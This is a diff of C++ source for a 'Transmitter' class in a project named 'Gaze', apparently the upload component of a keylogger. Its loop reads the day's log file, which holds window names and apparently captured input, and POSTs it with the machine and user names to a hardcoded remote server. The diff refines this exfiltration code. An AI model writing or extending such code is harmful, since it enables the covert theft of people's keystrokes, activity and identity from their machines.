@@ -16,11 +16,16 @@ Transmitter::Transmitter(Logger* logger)
 // Start() : Start sending log to server (ment to be lunch in a thread)
 void Transmitter::Start()
 {
+	this->Transmitting = true;
+
+	// Keep transmiting while transmitting is set to true
 	while (this->IsTransmitting())
 	{
+		// If elapsed time is >= Waiting time constant defined in Transmitter.h
 		if (Timer.getElapsedTime() >= WAITING_TIME)
 		{
-			// Initialize the http request
+			// Initialize the http object and request
+			Http http(WEB_SERVER);
 			Http::Request request(WEB_PAGE, Http::Request::Post);
 
 			// Initialize the string stream containing the request
@@ -29,28 +34,29 @@ void Transmitter::Start()
 			// Open the currently active log file
 			ifstream file(Utilities::GetCurrentDate() + ".log");
 
-			// Read all file content into memory
-			streampos size = file.tellg();
-			char* content = new char[size];
-			file.seekg(0, ios::beg);
-			file.read(content, size);
-			file.close();			
+			// Getline by line file content
+			string line;
+			string content= "";
+			while (getline(file, line)) // Even line = window name
+			{
+				content += line; 
+			}
 
 			// Forge the http request
 			stream << "machine=" << this->GetMachine() << "&user=" << this->GetUser() << "&file=" << content;
 			request.setField("From", "Gaze");
+			request.setField("Content-Type", "text/plain");
 			request.setBody(stream.str());
 
+			// Display request
+			cout << stream.str() << endl;
+
 			// Send request and get the response from the server
-			Http http(WEB_SERVER);
 			Http::Response response = http.sendRequest(request);
 
 			// Restart timer and actualise LastTransmission
 			this->Timer.restart();
 			this->LastTransmission = Utilities::GetCurrentDate();
-
-			// Delete properly the file content pointer
-			delete[] content;
 		}
 	}
 }
